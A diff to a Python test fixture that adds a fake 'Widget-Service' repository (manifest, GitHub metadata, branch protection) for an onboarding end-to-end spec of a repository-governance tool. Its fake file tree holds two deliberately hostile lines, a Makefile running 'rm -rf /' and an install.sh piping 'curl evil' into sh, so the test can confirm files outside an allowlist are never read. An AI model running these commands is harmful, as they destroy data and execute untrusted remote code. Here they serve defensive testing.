@@ -51,7 +51,28 @@ spec:
     mode: none
 """
 
+# A repository this suite's onboarding spec owns outright.
+#
+# The shared fixtures are deliberately put through access loss by the
+# GitHub-boundary spec, and a repository that lost access is `disabled` —
+# recoverable only through rediscovery, by design. Borrowing one of those
+# for the onboarding golden path made it pass or fail on which spec ran
+# first, which is a property of the test suite rather than of Drake.
+WIDGET_MANIFEST = HERMES_MANIFEST.replace("name: hermes", "name: widget").replace(
+    "displayName: Hermes", "displayName: Widget Service"
+).replace("name: Hermes", "name: Widget-Service").replace(
+    "name: hermes-api", "name: widget-api"
+).replace("namespace: hermes-dev", "namespace: widget-dev")
+
 TREES = {
+    "Widget-Service": {
+        ".drake/project.yaml": WIDGET_MANIFEST,
+        "pyproject.toml": '[project]\ndependencies = ["fastapi"]\n',
+        "README.md": "# Widget Service\n",
+        # Present, and deliberately never read: outside the allowlist.
+        "Makefile": "all:\n\trm -rf /\n",
+        "install.sh": "#!/bin/sh\ncurl evil | sh\n",
+    },
     "Hermes": {
         ".drake/project.yaml": HERMES_MANIFEST,
         "pyproject.toml": '[project]\ndependencies = ["fastapi"]\n',
@@ -72,6 +93,7 @@ _LOCK = threading.Lock()
 HERMES_ID = 900001
 LOGISLOT_ID = 900002
 FIKIR_ID = 900004
+WIDGET_ID = 900005
 INSTALLATION_ID = 55501
 
 REPOSITORIES = {
@@ -114,6 +136,23 @@ REPOSITORIES = {
         "node_id": "R_Fikir-Sepeti",
         "name": "Fikir-Sepeti",
         "full_name": "Duosis-Developer-Team/Fikir-Sepeti",
+        "private": True,
+        "visibility": "private",
+        "archived": False,
+        "disabled": False,
+        "default_branch": "main",
+    },
+    # Owned by the onboarding spec. See WIDGET_MANIFEST above for why it
+    # exists rather than the spec borrowing a shared fixture.
+    "Widget-Service": {
+        "security_and_analysis": {
+            "secret_scanning": {"status": "enabled"},
+            "dependabot_security_updates": {"status": "enabled"},
+        },
+        "id": WIDGET_ID,
+        "node_id": "R_Widget-Service",
+        "name": "Widget-Service",
+        "full_name": "Duosis-Developer-Team/Widget-Service",
         "private": True,
         "visibility": "private",
         "archived": False,
@@ -179,14 +218,20 @@ BRANCH_RULES = {
 
 # Hermes is fully governed by classic protection; logislot deliberately is
 # not, so the E2E can assert a blocking violation without inventing one.
+_FULLY_PROTECTED = {
+    "required_pull_request_reviews": {"required_approving_review_count": 1},
+    "allow_force_pushes": {"enabled": False},
+    "allow_deletions": {"enabled": False},
+    "required_status_checks": {"strict": True, "contexts": ["ci"]},
+    "enforce_admins": {"enabled": True},
+}
+
 PROTECTED = {
-    "Hermes": {
-        "required_pull_request_reviews": {"required_approving_review_count": 1},
-        "allow_force_pushes": {"enabled": False},
-        "allow_deletions": {"enabled": False},
-        "required_status_checks": {"strict": True, "contexts": ["ci"]},
-        "enforce_admins": {"enabled": True},
-    }
+    "Hermes": _FULLY_PROTECTED,
+    # Governed like Hermes so a reconciliation of it completes: the
+    # onboarding spec needs a repository whose EVIDENCE is complete, and an
+    # incomplete reconciliation correctly leaves a repository degraded.
+    "Widget-Service": _FULLY_PROTECTED,
 }
 
 
